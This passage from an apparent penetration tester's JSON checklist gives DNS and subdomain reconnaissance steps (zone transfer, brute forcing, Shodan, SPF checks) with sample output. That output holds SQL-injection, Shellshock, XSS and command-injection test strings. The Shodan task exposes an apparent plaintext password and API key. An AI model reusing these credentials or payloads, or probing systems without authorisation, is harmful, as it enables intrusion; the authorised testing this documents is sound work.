                        "name": "SubDomains - SSL Certificate Transparency Logs",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41871ba-2af0-11ee-91bc-3b10d30768a2",
                        "ordinal": 2,
                        "masterFindingId": 17073009,
                        "taskInstructions": "<h2>Instructions</h2>\nReview crt.sh and scraped SSL certificate host names for potential Active Directory domain names.\nReview fully registered SSL certificates for potential internal hostname, and other information disclosure.\n\n<h2>Variation: Invoke-CTFR-Lookup2.psm1</h2>\n1. Download Invoke-CTFR-Lookup2.psm1\n<ncode>https://github.com/NetSPI/PowerShell-Private-Old/blob/972bdce8b3f123c98214248b8f3be735f865fc9d/Invoke-CTFR-Lookup2.psm1\n</ncode>\n2. Run the domain collection and use the -ShowAdDomains flag\n<ncode>PS C:\\&gt; $Results = Invoke-CTFR-Lookup2 -Verbose -ShowAdDomains  -domain &quot;acme.com&quot; -ADOutputFile c:\\temp\\domains.txt\nVERBOSE: Imported 1 domain/keyword targets from command line.\nVERBOSE: Targeting 1 unique domains/keywords.\nVERBOSE: acme.com\nVERBOSE:  - Pulling records from crt.sh\nVERBOSE:  - Cleaning data\nVERBOSE:  - Processing sub domains\nVERBOSE: Checking for potential Active Directory domains.\nVERBOSE: 19 potential Active Directory domains were found.\nVERBOSE: - api.open.acme.com\nVERBOSE: - corp.acme.com\nVERBOSE: - dts.acme.com\nVERBOSE: - eprocurement.acme.com\nVERBOSE: - fhirpoint.open.acme.com\nVERBOSE: - fhirpointdev.open.acme.com\nVERBOSE: - fhirpointstage.open.acme.com\nVERBOSE: - fhirpointtest.open.acme.com\nVERBOSE: - inside.acme.com\nVERBOSE: - insidetest.acme.com\nVERBOSE: - intranet.acme.com\nVERBOSE: - mobility.acme.com\nVERBOSE: - open.acme.com\nVERBOSE: - rd.acme.com\nVERBOSE: - sandbox.open.acme.com\nVERBOSE: - intranet.open.acme.com\nVERBOSE: - im.acme.com\nVERBOSE: - copr.acme.com\nVERBOSE: - corp.acme.com\nVERBOSE: 389 domains found.\nVERBOSE: All done.\n</ncode>\n3. Review the discovered subdomains.\n<ncode>PS C:\\&gt; gc C:\\temp\\domains.txt\napi.open.acme.com\ncorp.acme.com\ndts.acme.com\neprocurement.acme.com\nfhirpoint.open.acme.com\nfhirpointdev.open.acme.com\nfhirpointstage.open.acme.com\nfhirpointtest.open.acme.com\ninside.acme.com\ninsidetest.acme.com\nintranet.acme.com\nmobility.acme.com\nopen.acme.com\nrd.acme.com\nsandbox.open.acme.com\nintranet.open.acme.com\nim.acme.com\ncopr.acme.com\ncorp.acme.com\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] SubDomains - SSL Certificate Scanning",
                        "state": 2,
                        "comments": 0,
                        "uid": "c417e2d6-2af0-11ee-91b9-4f31006451f6",
                        "ordinal": 7,
                        "masterFindingId": 17063356,
                        "taskInstructions": "Refer to the linked finding for verification instructions.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] RDNS",
                        "state": 2,
                        "comments": 0,
                        "uid": "c418b4a4-2af0-11ee-91bd-bf94ebef7ec6",
                        "ordinal": 6,
                        "masterFindingId": 16881,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nPerform reverse DNS scans. This should always be done.\n\n<h2><b>Variation: Nmap</b></h2>\n<ncode>nmap -sL -iL hosts -oA Client-RDNS\n</ncode>\n<h2><b>Variation: Recon-ng</b></h2>\n<ncode>Recon-ng use recon/hosts-hosts/reverse_resolve, import ips\n</ncode>\n<h2><b>Variation:  dnsrecon.py</b></h2>\nNote: This recommendation to obtain additional DNS records from exposed name servers.\nLook for name servers to target.\n<ncode>./dnsrecon.py -d domain.com -a -z -g -w -c output.csv --threads 15 -f\n</ncode>\n- Default = srv and std record lookups\n-a = zone transfer attempt\n-z = dnssec zonewalk through\n-g  = google subdomain search\n-w = full reverse look up for ranges, then lookup against range (can take a while)\n-c output.csv = CSV output\n--threads 15 = threading for reverse lookups\n-f = wildcard defined IP Address when saving records\nor\n<ncode>dnsrecon -r 10.2.2.0/24\n</ncode>\n<h2><b>Reporting Requirements</b></h2>\n<ul><li>Add discovery domains to target list, but ensure they resolve back to in scope IP addresses.</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] SubDomains - Brute Forcing",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4185798-2af0-11ee-91bb-c34c719f02b5",
                        "ordinal": 8,
                        "masterFindingId": 17063352,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nPerform brute forcing to discover subdomains.\n\n<h2>Variation: dnsrecon</h2>\n1. Run command commands to identify subdomains.\n<ncode>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt --xml /path/to/file.xml\n</ncode>\nor\n<ncode>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt -n [name server ip] --threads 15 --xml /path/to/file.xml\n</ncode>\n<h2>Variation: amass</h2>\n1. Install amass via apt.\n<ncode>sudo apt install amass\n</ncode>\n2. Run the following command.\n<ncode>amass enum -brute [-w wordlist] -d netspi.com\n</ncode>\n<h2>Variation: gobuster</h2>\n1. Install gobuster via apt.\n\n2. Run the following command.\n<ncode>gobuster dns -d netspi.com -w wordlist -t 20\n</ncode>\n<h2>Dealing with wild card records</h2>\nWhen a brute force is performed against a domain using a wildcard record every request is going to come back as successful, either with a real result or that of the default record. Below is a summary of how to deal with it.\n\n1. Determine wildcard exists by querying for a long random subdomain.  If A records are returned then a wildcard record is most likely being used.\n<ncode>dig adsfadfasdfasdf.domain.com\n</ncode>\n2. Conduct DNS brute forcing of the domain, but filter out the wildcard IP addresses from the results to obtain a list of real sub domains.\n<ncode>dnsrecon -d domain.com -D /root/dnsrecon/subdomains-top1mil-20000.txt -t brt --xml /path/to/file.xml\n</ncode>\n3. Fiter out results known wild card servers\n<ncode>grep -v &quot;wildcardip1&quot; file.xml | grep -v &quot;wildcardip2&quot; | grep -v &quot;wildcardip3&quot; \n</ncode>\n<b>Reference:</b> https://digi.ninja/blog/dns_wildcard_recon.php\n\n<h2><b>Report Requirements</b></h2>\n<ul><li>Record newly discovered domain names for later targeting.</li>\n<li>For the task also show the command and a truncated version of the output to illustrate the attack process.</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] SubDomains - Certstream",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4175190-2af0-11ee-91b5-c3ed9e72605f",
                        "ordinal": 16,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nConsider monitoring certstream using a tool like bucketstream during testing to identify potentially new client domain created during testing.\n\n<b>Note:</b> You are NOT required to spend a lot of time on this one, eventually we'll need some automation for this.\n<b>Note:</b> Sometimes this reveals internal Active Directory domain names and internal computer names.\n\n<h2><b>Variation: Certstream.calidog.io</b></h2>\n<b>Reference:</b> https://certstream.calidog.io/\n\n1.  Visit the cert stream website at https://certstream.calidog.io/ or download the binaries to monitor the stream for certificated information associate with the client or known domains.\n\n<h2><b>Variation: Certstream</b></h2>\n1. You can also install certstream on your Linux system. Below are some sample commands:\n<ncode>apt-get install certstream\ncertstream --json\ncertstream | grep -i &quot;mycompany&quot;\n</ncode>\n2. Review the information for undocumented domain names. They should be found in the commonName field.\n\n<h2><b>Variation: BucketStream</b></h2>\n<b>Reference:</b> https://github.com/eth0izzle/bucket-stream\n\nThis tool simply listens to various certificate transparency logs (via certstream) and attempts to find public S3 buckets from permutations of the certificates domain name. \n\n1. Installation. Python 3.4+ and pip3 are required.\n<ncode>git clone https://github.com/eth0izzle/bucket-stream.git\n(optional) Create a virtualenv with pip3 install virtualenv &amp;&amp; virtualenv .virtualenv &amp;&amp; source .virtualenv/bin/activate\npip3 install -r requirements.txt\npython3 bucket-stream.py\n</ncode>\n2. You can run it with other options as well.\n<h3>Example:</h3>\n<ncode>python3 bucket-stream.py --threads 20 --permutations /root/mypermutations.txt\n</ncode>\n<h2><b>Reporting Requirements</b></h2>\nRecord the newly discovered domains in the task notes and include them in the vulnerability scanning process if they are in scope.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Validate Discovered Domains Resolve to in Scope IPs - Remove Out of Scope Domains",
                        "state": 2,
                        "comments": 0,
                        "uid": "c417d43a-2af0-11ee-91b8-8b7ebc98ff57",
                        "ordinal": 13,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nVerify all domains discovery map back to in scope IP ranges prior to the start of testing.\n\n<h2>Variation: ClientChecker</h2>\nClientChecker is a python script that compares domain/hostnames provided by the client to the in-scope IP list. This script takes the domain/hostname list, does an nslookup against the in-scope IPs, and outputs any inconsistencies. IPs must have their own line and no CIDR notation. Hostnames must have their own newline as well.\n\n1. Download ClientChecker\n<ncode>https://github.com/NetSPI/Scripts-Private/blob/master/ClientChecker\n</ncode>\n<h3>Example:</h3>\n<ncode>python clientchecker.py -d [file of hostnames] -i [file of IPs]\n</ncode>\nInscope IPs (ips.txt)\n<ncode>10.2.21.40\n104.197.208.225\n10.2.21.2\n</ncode>\nDomain Names that were enumerated (hosts.txt)\n<ncode>correlatedvm.netspi.com\nftp.netspi.com\nabcd.netspi.com (no dns entry)\nsqlwiki.netspi.com (resolved IP not listed in in-scope IPs)\n</ncode>\nOutput:\n<ncode><b>python clientchecker.py -i ips.txt -d hosts.txt</b>\n\nOut of scope hostnames:\nabcd.netspi.com -&gt; No associated IP address\nsqlwiki.netspi.com -&gt; 185.199.110.153\nsqlwiki.netspi.com -&gt; 185.199.109.153\nsqlwiki.netspi.com -&gt; 185.199.111.153\nsqlwiki.netspi.com -&gt; 185.199.108.153\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Zone Transfer",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4160d58-2af0-11ee-91af-ff022fecdea6",
                        "ordinal": 0,
                        "masterFindingId": 16893,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform a DNS Zone Transfer and review the results.\n\n<h2>Variation: dig</h2>\n1. Use the linux tool dig to perform an axfr request.\n<ncode>dig axfr @target.dns.server target.domain\n</ncode>\n<h3>Example:</h3>\n<ncode>dig axfr @nsztm1.digi.ninja zonetransfer.me\n\n; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; axfr @nsztm1.digi.ninja zonetransfer.me\n; (1 server found)\n;; global options: +cmd\nzonetransfer.me.        7200    IN      SOA     nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600\nzonetransfer.me.        300     IN      HINFO   &quot;Casio fx-700G&quot; &quot;Windows XP&quot;\nzonetransfer.me.        301     IN      TXT     &quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;\nzonetransfer.me.        7200    IN      MX      0 ASPMX.L.GOOGLE.COM.\nzonetransfer.me.        7200    IN      MX      10 ALT1.ASPMX.L.GOOGLE.COM.\nzonetransfer.me.        7200    IN      MX      10 ALT2.ASPMX.L.GOOGLE.COM.\nzonetransfer.me.        7200    IN      MX      20 ASPMX2.GOOGLEMAIL.COM.\nzonetransfer.me.        7200    IN      MX      20 ASPMX3.GOOGLEMAIL.COM.\nzonetransfer.me.        7200    IN      MX      20 ASPMX4.GOOGLEMAIL.COM.\nzonetransfer.me.        7200    IN      MX      20 ASPMX5.GOOGLEMAIL.COM.\nzonetransfer.me.        7200    IN      A       5.196.105.14\nzonetransfer.me.        7200    IN      NS      nsztm1.digi.ninja.\nzonetransfer.me.        7200    IN      NS      nsztm2.digi.ninja.\n_acme-challenge.zonetransfer.me. 301 IN TXT     &quot;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI&quot;\n_sip._tcp.zonetransfer.me. 14000 IN     SRV     0 0 5060 www.zonetransfer.me.\n14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.\nasfdbauthdns.zonetransfer.me. 7900 IN   AFSDB   1 asfdbbox.zonetransfer.me.\nasfdbbox.zonetransfer.me. 7200  IN      A       127.0.0.1\nasfdbvolume.zonetransfer.me. 7800 IN    AFSDB   1 asfdbbox.zonetransfer.me.\ncanberra-office.zonetransfer.me. 7200 IN A      202.14.81.230\ncmdexec.zonetransfer.me. 300    IN      TXT     &quot;; ls&quot;\ncontact.zonetransfer.me. 2592000 IN     TXT     &quot;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes&quot;\ndc-office.zonetransfer.me. 7200 IN      A       143.228.181.132\ndeadbeef.zonetransfer.me. 7201  IN      AAAA    dead:beaf::\ndr.zonetransfer.me.     300     IN      LOC     53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m\nDZC.zonetransfer.me.    7200    IN      TXT     &quot;AbCdEfG&quot;\nemail.zonetransfer.me.  2222    IN      NAPTR   1 1 &quot;P&quot; &quot;E2U+email&quot; &quot;&quot; email.zonetransfer.me.zonetransfer.me.\nemail.zonetransfer.me.  7200    IN      A       74.125.206.26\nHello.zonetransfer.me.  7200    IN      TXT     &quot;Hi to Josh and all his class&quot;\nhome.zonetransfer.me.   7200    IN      A       127.0.0.1\nInfo.zonetransfer.me.   7200    IN      TXT     &quot;ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.&quot;\ninternal.zonetransfer.me. 300   IN      NS      intns1.zonetransfer.me.\ninternal.zonetransfer.me. 300   IN      NS      intns2.zonetransfer.me.\nintns1.zonetransfer.me. 300     IN      A       81.4.108.41\nintns2.zonetransfer.me. 300     IN      A       167.88.42.94\noffice.zonetransfer.me. 7200    IN      A       4.23.39.254\nipv6actnow.org.zonetransfer.me. 7200 IN AAAA    2001:67c:2e8:11::c100:1332\nowa.zonetransfer.me.    7200    IN      A       207.46.197.32\nrobinwood.zonetransfer.me. 302  IN      TXT     &quot;Robin Wood&quot;\nrp.zonetransfer.me.     321     IN      RP      robin.zonetransfer.me. robinwood.zonetransfer.me.\nsip.zonetransfer.me.    3333    IN      NAPTR   2 3 &quot;P&quot; &quot;E2U+sip&quot; &quot;!^.&#42;$!sip:customer-service@zonetransfer.me!&quot; .\nsqli.zonetransfer.me.   300     IN      TXT     &quot;' or 1=1 --&quot;\nsshock.zonetransfer.me. 7200    IN      TXT     &quot;() { :]}; echo ShellShocked&quot;\nstaging.zonetransfer.me. 7200   IN      CNAME   www.sydneyoperahouse.com.\nalltcpportsopen.firewall.test.zonetransfer.me. 301 IN A 127.0.0.1\ntesting.zonetransfer.me. 301    IN      CNAME   www.zonetransfer.me.\nvpn.zonetransfer.me.    4000    IN      A       174.36.59.154\nwww.zonetransfer.me.    7200    IN      A       5.196.105.14\nxss.zonetransfer.me.    300     IN      TXT     &quot;'&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;&quot;\nzonetransfer.me.        7200    IN      SOA     nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600\n;; Query time: 150 msec\n;; SERVER: 81.4.108.41&#35;53(nsztm1.digi.ninja) (TCP)\n;; WHEN: Wed Mar 23 16:12:57 CDT 2022\n;; XFR size: 50 records (messages 1, bytes 1994)\n</ncode>\n<h2>Variation: dnsrecon</h2>\n1. Install dnsrecon.\n<ncode>sudo apt install dnsrecon\n</ncode>\n2.  Run the following command.\n<ncode>dnsrecon -d domain -a\n</ncode>\n<h3>Example:</h3>\n<ncode>dnsrecon -d zonetransfer.me -a\n\n[&#42;] std: Performing General Enumeration against: zonetransfer.me...\n[&#42;] Checking for Zone Transfer for zonetransfer.me name servers\n[&#42;] Resolving SOA Record\n[+]      SOA nsztm1.digi.ninja 81.4.108.41\n[&#42;] Resolving NS Records\n[&#42;] NS Servers found:\n[+]      NS nsztm1.digi.ninja 81.4.108.41\n[+]      NS nsztm2.digi.ninja 34.225.33.2\n[&#42;] Removing any duplicate NS server IP Addresses...\n[&#42;]\n[&#42;] Trying NS server 34.225.33.2\n[+] 34.225.33.2 Has port 53 TCP Open\n[+] Zone Transfer was successful!!\n[&#42;]      SOA nsztm1.digi.ninja 81.4.108.41\n[&#42;]      NS nsztm1.digi.ninja 81.4.108.41\n[&#42;]      NS nsztm2.digi.ninja 34.225.33.2\n[&#42;]      NS intns1.zonetransfer.me 81.4.108.41\n[&#42;]      NS intns2.zonetransfer.me 167.88.42.94\n[&#42;]      TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\n[&#42;]      TXT 2acOp15rSxBpyF6L7TqnAoW8aI0vqMU5kpXQW7q4egc\n[&#42;]      TXT 6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\n[&#42;]      TXT ; ls\n[&#42;]      TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes\n[&#42;]      TXT AbCdEfG\n[&#42;]      TXT Hi to Josh and all his class\n[&#42;]      TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.\n[&#42;]      TXT Robin Wood\n[&#42;]      TXT ' or 1=1 --\n[&#42;]      TXT () { :]}; echo ShellShocked\n[&#42;]      TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;\n[&#42;]      PTR www.zonetransfer.me 5.196.105.14\n[&#42;]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 142.251.16.27\n[&#42;]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2607:f8b0:4004:c09::1b\n[&#42;]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 209.85.202.27\n[&#42;]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:400b:c00::1a\n[&#42;]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 64.233.184.26\n[&#42;]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2a00:1450:400c:c0b::1b\n[&#42;]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 209.85.202.26\n[&#42;]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:400b:c00::1b\n[&#42;]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 64.233.184.27\n[&#42;]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2a00:1450:400c:c0b::1b\n[&#42;]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 142.250.27.27\n[&#42;]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2a00:1450:4025:401::1a\n[&#42;]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 142.250.153.27\n[&#42;]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2a00:1450:4013:c16::1b\n[&#42;]      AAAA deadbeef.zonetransfer.me dead:beaf::\n[&#42;]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332\n[&#42;]      A @.zonetransfer.me 5.196.105.14\n[&#42;]      A asfdbbox.zonetransfer.me 127.0.0.1\n[&#42;]      A canberra-office.zonetransfer.me 202.14.81.230\n[&#42;]      A dc-office.zonetransfer.me 143.228.181.132\n[&#42;]      A email.zonetransfer.me 74.125.206.26\n[&#42;]      A home.zonetransfer.me 127.0.0.1\n[&#42;]      A intns1.zonetransfer.me 81.4.108.41\n[&#42;]      A intns2.zonetransfer.me 52.91.28.78\n[&#42;]      A office.zonetransfer.me 4.23.39.254\n[&#42;]      A owa.zonetransfer.me 207.46.197.32\n[&#42;]      A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1\n[&#42;]      A vpn.zonetransfer.me 174.36.59.154\n[&#42;]      A www.zonetransfer.me 5.196.105.14\n<b>[TRUNCATED]</b>\n</ncode>\n<h2>Report Requirements</h2>\n<ul><li>Record internal IPs in task notes</li>\n<li>Record newly discovered domains for later targeting</li>\n<li>For the finding, also show the command and a truncated version of the output to illustrate the attack process</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] SubDomains - Shodan",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4172daa-2af0-11ee-91b4-eb008cba84c2",
                        "ordinal": 15,
                        "masterFindingId": 17063364,
                        "taskInstructions": "<h2>Instructions</h2>\nReview Shodan data for available ports and services.\n\n<h2>Variation: smap</h2>\n1. Download the latest release, or download the source and build with go.\n<ncode>go install -v github.com/s0md3v/smap/cmd/smap@latest\n</ncode>\nOR\n<ncode>git clone https://github.com/s0md3v/Smap.git\ncd Smap/cmd/smap\ngo build\n</ncode>\n2. Run the tool.\n<h3>Example:</h3>\n<ncode>./smap -oS - scanme.nmap.org\n\nSmap (0.1.0-rc)\n\n+ 45.33.32.156 (scanme.nmap.org, scanme.nmap.org)\n  - OS: MiniBSD\n  - Tags: cloud\n  + Ports:\n    - 80 tcp/http cpe:/a:apache:http_server:2.4.7\n    - 22 tcp/ssh?\n    - 123 tcp/ntp?\n    - Vulns: CVE-2018-1312, CVE-2015-3185, CVE-2016-0736, CVE-2014-0231, CVE-2017-7679, CVE-2019-0220, CVE-2014-8109, CVE-2018-1283, CVE-2017-15715, CVE-2016-8612, CVE-2016-2161, CVE-2014-3523, CVE-2014-0118, CVE-2014-0226, CVE-2018-17199, CVE-2014-0117, CVE-2017-15710, CVE-2015-3184, CVE-2017-9798, CVE-2013-6438, CVE-2016-4975, CVE-2014-0098, CVE-2017-9788, CVE-2016-8743\n</ncode>\n<h2>Variation: Manual</h2>\n1. Log into shodan.io\n<ncode>https://account.shodan.io/\n</ncode>\nWeb Login:\n<ncode>User: ipsten\nPass: tCi6VdPE5p1QyGBTfNkMzIy0qoon89qqZrLwYk\n</ncode>\nAPI Key (for any tools that could use it):\n<ncode>TsAUQ1SFV04sjSQIjD2ympPfF0jLe2Sz\n</ncode>\n2. Attempt to identify useful information for in scope IP addresses. Consider searching by IP, IP range, and company name.  Below are some examples.\n<ul><li>org:&quot;comcast&quot;</li>\n<li>org:&quot;comcast&quot; city:minneapolis</li>\n<li>net:206.209.112.0/24</li>\n<li>port:443</li>\n<li>product:&quot;SonicWALL firewall http config&quot; port:&quot;443&quot;</li>\n<li>Apache city:&quot;San Francisco&quot; port:&quot;8080&quot; product:&quot;Apache Tomcat/Coyote JSP engine&quot;</li>\n<li>ameriprise org:&quot;Amazon.com&quot;</li>\n</ul>\n<h3><b>Report Verification</b></h3>\nInclude copies of relevant data in the task notes and be sure to create findings for identified vulnerable versions. You may also be able to recover subdomains for targeting. Also, watch for the use of AWS and Azure.\n\n<h3>More Notes</h3>\n<b>Note:</b> Ryan K is working on a database and api.\nLink to information finding - users exposed in breach data.\nWe need to add a finding to the &quot;Vulnerability Enumeration: Manual Findings&quot; category:\n<ul><li>Run shodan dump to get basic service information</li>\n</ul>\nCommon use cases for data\n<ul><li>determine if we are being blocked by ips</li>\n<li>choose systems for sampled testing after discovery scanning / dump</li>\n<li>identify potential vulnerabilities</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] TXT Records - SPF",
                        "state": 2,
                        "comments": 0,
                        "uid": "c416b5aa-2af0-11ee-91b1-f753df8c5764",
                        "ordinal": 10,
                        "masterFindingId": 17059062,
                        "taskInstructions": "<h2>Instructions</h2>\nVerify SPF records exist for email domains, white listed IP ranges and domains cannot be hijacked.\nCheck for SPF records on domains being used for email to identify missed SPF records and interesting TXT records that could indicate the use of technologies that could be targeted in future attacks.\n\n<b>Important Notes</b>\n<ul><li>SPF records are a type of DNS TXT record.</li>\n<li>SPF records contains a list of internet servers allowed to send email for the domain.</li>\n<li>SPF records can include a &quot;soft fail&quot; (~all) to indicate that IPs sending email for the domain that are not on the list should be marked as SPAM.</li>\n<li>SPF records can include a hard fail (-all) to indicate that IPs sending email for the domain that are not on the list should be blocked.</li>\n<li>SPF records may point to another TXT record using the &quot;include:&quot; setting.</li>\n</ul>\nClients getting mail from your domain validate the servers using your SPF records. However, they don't have to honor it.\n<b>Note:</b> As an attacker if you can obtain access to SPF IPs or relay through them you can spoof email from the domain.\n\n<h2>Variation: dig</h2>\n1. Use dig to identify SPF records.\n<ncode><b>dig txt google.com +short</b>\n\n<b><red>&quot;v=spf1 include:_spf.google.com ~all&quot;</red></b>\n&quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\n&quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\n&quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\n&quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\n&quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\n&quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\n&quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\n&quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;\n</ncode>\n<h2>Variation: checkdmarc</h2>\n1. Install checkdmarc.\n<ncode>pip install checkdmarc\n</ncode>\n2. Run checkdmarc against the target domain and use jq to filter for the SPF record.\n<ncode><b>checkdmarc google.com | jq '.spf.record'</b>\n\n&quot;v=spf1 include:_spf.google.com ~all&quot;\n</ncode>\n<h2>Variation: dnsrecon</h2>\n1. Run dnsrecon and review the returned records.\n<ncode><b>dnsrecon -d google.com</b>\n\n[&#42;] std: Performing General Enumeration against: google.com...\n[-] DNSSEC is not configured for google.com\n[&#42;]      SOA ns1.google.com 216.239.32.10\n[&#42;]      SOA ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns4.google.com 216.239.38.10\n[&#42;]      NS ns4.google.com 2001:4860:4802:38::a\n[&#42;]      NS ns3.google.com 216.239.36.10\n[&#42;]      NS ns3.google.com 2001:4860:4802:36::a\n[&#42;]      NS ns1.google.com 216.239.32.10\n[&#42;]      NS ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns2.google.com 216.239.34.10\n[&#42;]      NS ns2.google.com 2001:4860:4802:34::a\n[&#42;]      MX smtp.google.com 172.217.212.27\n[&#42;]      MX smtp.google.com 172.253.114.27\n[&#42;]      MX smtp.google.com 172.253.119.27\n[&#42;]      MX smtp.google.com 108.177.111.27\n[&#42;]      MX smtp.google.com 74.125.124.27\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c03::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c22::1b\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c23::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c14::1b\n[&#42;]      A google.com 142.250.191.174\n[&#42;]      AAAA google.com 2607:f8b0:4009:819::200e\n[&#42;]      <b><red>TXT google.com v=spf1 include:_spf.google.com ~all</red></b>\n[&#42;]      TXT google.com facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\n[&#42;]      TXT google.com apple-domain-verification=30afIBcvSuDV2PLX\n[&#42;]      TXT google.com globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\n[&#42;]      TXT google.com docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\n[&#42;]      TXT google.com google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\n[&#42;]      TXT google.com MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\n[&#42;]      TXT google.com docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\n[&#42;]      TXT google.com google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\n[&#42;]      TXT _dmarc.google.com v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\n<b>[TRUNCATED]</b>\n</ncode>\n<h2><b>Variation: nslookup</b></h2>\n1. Use nslookup and review the returned records.\n<ncode><b>nslookup -type=txt google.com</b>\n\nServer:         172.24.0.1\nAddress:        172.24.0.1&#35;53\n\nNon-authoritative answer:\ngoogle.com      text = <b><red>&quot;v=spf1 include:_spf.google.com ~all&quot;</red></b>\ngoogle.com      text = &quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\ngoogle.com      text = &quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\ngoogle.com      text = &quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\ngoogle.com      text = &quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\ngoogle.com      text = &quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\ngoogle.com      text = &quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\ngoogle.com      text = &quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\ngoogle.com      text = &quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;\n\nAuthoritative answers can be found from:\n</ncode>\n<h2>Reporting Requirements</h2>\n<ul><li>Follow up on any odd TXT records to determine if 